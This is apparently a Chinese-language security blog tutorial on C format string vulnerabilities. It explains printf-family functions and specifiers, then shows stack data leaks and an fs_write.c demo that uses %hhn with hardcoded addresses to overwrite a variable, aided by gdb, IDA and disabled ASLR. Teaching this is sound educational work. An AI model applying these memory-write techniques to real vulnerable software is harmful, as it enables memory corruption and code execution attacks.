---
layout:     post
title:      
subtitle:    
date:       2018-11-5
author:     XT
header-img: img/post-bg-coffee.jpeg
catalog: 	 true
tags:
    - 安全
---


> 格式化字符串

# 基本知识

## 常见的格式化输出函数

### printf

* 向stdout按规定的格式输出信息
* nt printf (const char *format,[argument]…)
* format是格式控制字符串，其他参数为输出项

### sprint

* 把格式化的数据写入某个字符串中
* int sprintf(char *buffer,const char *format,[argument]…)
* buffer是要写入字符串的缓冲区
* 这个函数就是把第三部分的数据，按照第二部分格式化字符的格式，把第三部分的数据进行”格式化“，然后在把格式化后的数据类型，存储到字符串的缓存区间里去

### Snprintf

* 在sprintf的基础上限制了可写入字符的最大值n当格式化后的字符串长度<size，则将字符串全部复制到str中，并在最后添加字符串结束符’\0’；当格式化后的字符串长度>=size，则将其中的size-1个字符复制到str中，并在最后添加字符串结束符’\0’
* int snprintf (char *str,size_t size,const char*format,[argument]…)

### fprintf

* 用于格式化输出到一个流/文件中
* int fprintf(FILE *stream,const char*,format,[argument]…)
* 根据指定的格式控制字符串format向输出流stream中写入数据当stream为stdout时，fprintf与printf的功能相同

**vprintf、vsprintf、vsnprintf、vfprintf 功能分别对应于printf，sprintf，snprintf和fprintf**

将变参列表换成了va_list类型的参数格式化字符串是由普通字符串和格式化规定字符构成的字符序列,普通字符被原封不动地复制到输出流中,格式化规定字符则是以’%’开始，用来确定输出内容格式。



## 格式化规定字符的基本格式如下

%parameter  fieldwidth .  precision

* **parameter**

  可以忽略或者是n$。n表示是参数列表的第n个参
  数，通过这种形式直接访问第n个参数

  **实例:**

  ```c
  #include <stdio.h>
  int main()
  {
  	int c=1;
  	int a=2;
     /* 我的第一个 C 程序 */
     printf("%2$d  %2$#x\n",c,a);
     
     return 0;
  }
  ```
  **运行结果:**
  ```c
  2  0x2
  ```

* **flags**
  用于调整输出和打印的符号、空白、小数点、八进制和十六进制前缀等

* **fieldwidth**

  限制显示数值的最小宽度，当输出字符个数不足限制的宽度时，默认用空格填充，或者flags中的其他填充方式；超过限制宽度不会截断，正常显示

* **precision**

  输出的最大长度

* **length**

  指浮点型参数或者整形参数的长度

  hh:输出一个字节

  h:输出一个双字节

* **type**

  转换说明符，用来说明所应用的转换类型，它是唯一必须的格式域

  |字符| 描述|
  |--|------|
  |d，i |有符号十进制整数|
  |u| 无符号十进制整数|
  |x，X| 以十六进制形式输出无符号整数(不输出前缀0x)|
  |o |以八进制形式输出无符号整数(不输出前缀0)|
  |s |字符串|
  |c |字符|
  |p| 指针|
  |n |不输出字符，把已经成功输出的字符个数写入对应的整型指针参数所指的变量|
  |f，F |以小数形式输出单、双精度实数|
  |e，E |以指数形式输出单、双精度实数|
  |g，G| 以%f%e中较短的输出宽度输出单、双精度实数,%e格式在指数小于-4或者大于等于精度时使用|
  |f，F |以小数形式输出单、双精度实数|
  |a，A |浮点数、十六进制数字和p-计数法|

# 格式化字符串利用方法

## 泄漏内存数据



```c
#include <stdio.h>
int main(void)
{
	printf("%d%d%d%x%s",5,6,8,0x21,"test");
	return 0;
}
```

打印出的这三个字符串正是位于format参数之后的数据

通过格式化字符串漏洞能够对栈中的数据进行泄露

![1541397574502](https://raw.githubusercontent.com/xineting/xineting.github.io/master/img/1541397558384.png)

## 覆盖内存

* 格式化输出函数除了能读取内存数据之外，还能够通过转换说明符%n向指定地址写入一个整数值。向任意地址写入数据的能力，可以被用于覆写内存中的关键数据。
* fs_write.c演示了利用格式化字符串漏洞，修改flag变量的值。

```c
#include<stdio.h>
#include<string.h>

int flag = 0xbabe;
int flag_addr = 0x804a028;
int main()
{
    int i,write_byte,already_write;
    int value = 0xbeef;

    char format[256]={0};
    char buf[256]={0};
    printf("flag:%#x\n",flag);

    strcpy(format,"\x28\xa0\x04\x08");
    strcat(format,"\x29\xa0\x04\x08"); 
    
    already_write=8;
    for(i=0;i<2;i++)
    {
        if(value>>(8*i)==0)
	   		break;
        write_byte = value>>(8*i)&0xff;
        sprintf(buf,"%%%dc%%%d$hhn",(write_byte-already_write+0x100)%0x100,11+i);
        //hh每次只写入一个字节
        already_write+=(write_byte-already_write)%0x100;
        strcat(format,buf);
    }
    printf(format);
    printf("flag:%#x\n",flag);
    //printf(format);
}

```

* fs_write.c演示了利用格式化字符串漏洞修改flag变量的值。flag的初值为0xbabe，利用格式化字符串漏洞，修改为0xbeef。

* 为了方便演示，先暂时关闭系统的ASLR保护。

* 复写内存的核心功能在printf(format)中实现，具体的思路是：
  * 首先在格式化字符串中放入flag变量的地址
  * 然后利用“$”来指定这个地址位于第几个参数，
  * 最终使用“%n”（即hhn）向这个参数所指向的地址处写入数据。

* 首先strcpy（）函数利用IDA事先分析后获取的flag变量地址，拷贝给format。

* 使用IDA事先查看flag的地址为0x804a028，由于要向flag中写入0xbeef，也就是说要向0x804a028和0x804a029两个地址中写入内容，因此将这两个地址放入到format中。

  ```assembly
  .data:0804A028 BE BA 00 00           flag          dd 0BABEh         ; DATA XREF: main+52r
  .data:0804A028                                                       ; main+6Eo ...
  .data:0804A02C
  ```
  

  将这两个地址放入到format中

  ```c
  strcpy(format,"\x28\xa0\x04\x08");
  strcat(format,"\x29\xa0\x04\x08");
  ```

  

  然后确定写在format数组里的两个地址属于printf的第几个参数，通过gdb进行调试，在printf(format)处设置断点进行查看。

* 下图所示，format的地址为0xffffce4c，是printf的第11个参数，即（0xffffce4c-0xffffce20）/4=11，由于flag的两个地址写在了format最开始的位置，因此它们分别是printf的第11和第12个参数。

  ![1541412207594](https://raw.githubusercontent.com/xineting/xineting.github.io/master/img/1541412207594.png)

* 覆写内存 执行printf(format)前下断点

  fomat的地址为0xffffd42c

  查看地址

  ![1541412866964](https://raw.githubusercontent.com/xineting/xineting.github.io/master/img/1541412866964.png)

  前两个为flag的地址

  后面的为字符串

  ![1541413028878](https://raw.githubusercontent.com/xineting/xineting.github.io/master/img/1541413028878.png)

  在栈中查看

  ![1541413097707](https://raw.githubusercontent.com/xineting/xineting.github.io/master/img/1541413097707.png)

  可以看到0x804a08的值已经改为了beef